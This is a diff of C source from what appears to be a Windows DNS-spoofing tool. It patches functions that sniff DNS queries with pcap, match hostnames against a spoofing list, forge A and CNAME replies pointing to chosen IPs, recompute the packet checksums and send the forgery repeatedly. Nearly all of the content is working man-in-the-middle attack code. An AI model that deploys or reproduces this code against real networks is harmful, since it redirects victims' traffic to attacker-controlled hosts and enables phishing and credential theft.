@@ -22,39 +22,38 @@ BOOL DnsRequestSpoofing(unsigned char * rawPacket, pcap_t *deviceHandle, PPOISON
   int basePacketSize = sizeof(ETHDR) + sizeof(IPHDR) + sizeof(UDPHDR);
   PDNS_HEADER dnsBasicHdr = (PDNS_HEADER) (rawPacket + basePacketSize);
   PRAW_DNS_DATA responseData = NULL;
-  int counter = 0;
-  //char errbuf[PCAP_ERRBUF_SIZE];
-  
+  int counter = 0;  
 
   // Create DNS response data block
   if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_A)
   {
-    responseData = CreateDnsResponse_A(spoofingRecord->HostnodeToSpoof->Data.HostName, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
+    responseData = CreateDnsResponse_A(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
+
   }
   else if (spoofingRecord->HostnodeToSpoof->Data.Type == RESP_CNAME)
   {
     LogMsg(DBG_DEBUG, "DnsRequestSpoofing(): Data.HostName=%s, Data.CnameHost=%s, Data.SpoofedIp=%s, Data.TTL=%lu", spoofingRecord->HostnodeToSpoof->Data.HostName, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
-    responseData = CreateDnsResponse_CNAME(spoofingRecord->HostnameToSpoof, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
+    responseData = CreateDnsResponse_CNAME(spoofingRecord->HostnameToResolve, dnsBasicHdr->id, spoofingRecord->HostnodeToSpoof->Data.CnameHost, spoofingRecord->HostnodeToSpoof->Data.SpoofedIp, spoofingRecord->HostnodeToSpoof->Data.TTL);
   }
-
+  
   if (responseData == NULL)
   {
     retVal = FALSE;
     goto END;
   }
-
+  
   if ((spoofedDnsResponse = (unsigned char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, basePacketSize + responseData->dataLength)) == NULL)
   {
     retVal = FALSE;
     goto END;
   }
-
+  
   CopyMemory(spoofedDnsResponse, rawPacket, basePacketSize);
   CopyMemory(spoofedDnsResponse + basePacketSize, responseData->data, responseData->dataLength);
 
   // Adjust and prepare data on OSI layer 2 to 4
   FixNetworkLayerData4Request(spoofedDnsResponse, responseData);
-
+  
   // Keep sending the crafted dns reply packet to client till max 5 times if not successful
   for (counter = 5; counter > 0; counter--) 
   {
@@ -155,7 +154,6 @@ void FixNetworkLayerData4Request(unsigned char * data, PRAW_DNS_DATA responseDat
   ZeroMemory(&tempDataBuffer, sizeof(tempDataBuffer));
   CopyMemory(tempDataBuffer + sizeof(UDP_PSEUDO_HDR), (unsigned char *)udpHdr, sizeof(UDPHDR) + responseData->dataLength);  
   udpPseudoHdr = (PUDP_PSEUDO_HDR)tempDataBuffer;
-
   udpPseudoHdr->saddr = ipHdr->saddr;
   udpPseudoHdr->daddr = ipHdr->daddr;
   udpPseudoHdr->unused = 0;
@@ -188,7 +186,7 @@ PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   unsigned char *reader = NULL;
   int stop;
   unsigned char *peerName = NULL;
-
+  
   if (gDnsSpoofingList->next == NULL || 
       ethrHdr == NULL || 
       htons(ethrHdr->ether_type) != ETHERTYPE_IP)
@@ -208,7 +206,7 @@ PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   {
     goto END;
   }
-  
+ 
   updHdr = (PUDPHDR)((unsigned char*)ipHdr + ipHdrLen);
   if (updHdr == NULL ||
       updHdr->ulen <= 0 ||
@@ -216,20 +214,20 @@ PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
   {
     goto END;
   }
-
+  
   dnsData = ((char*)updHdr + sizeof(UDPHDR));
   if ((dnsHdr = (PDNS_HEADER)&dnsData[sizeof(DNS_HEADER)]) == NULL)
   {
     goto END;
   }
-
+  
   if (ntohs(dnsHdr->q_count) <= 0)
   {
     goto END;
   }
 
-  stop = 0;
   reader = (unsigned char *)&dnsData[sizeof(DNS_HEADER)];
+  stop = 0;
   if ((peerName = ChangeDnsNameToTextFormat(reader, (unsigned char *)dnsHdr, &stop)) == NULL)
   {
     goto END;
@@ -240,12 +238,12 @@ PPOISONING_DATA DnsRequestPoisonerGetHost2Spoof(u_char *dataParam)
     goto END;
   }
 
-  strncpy(retVal->HostnameToSpoof, peerName, strnlen(peerName, sizeof(retVal->HostnameToSpoof) - 1));
+  strncpy(retVal->HostnameToResolve, peerName, strnlen(peerName, MAX_BUF_SIZE - 1));
   if ((tmpNode = GetNodeByHostname(gDnsSpoofingList, peerName)) != NULL)
   {
     retVal->HostnodeToSpoof = tmpNode;
   }
-
+  
 END:
   if (peerName != NULL)
   {
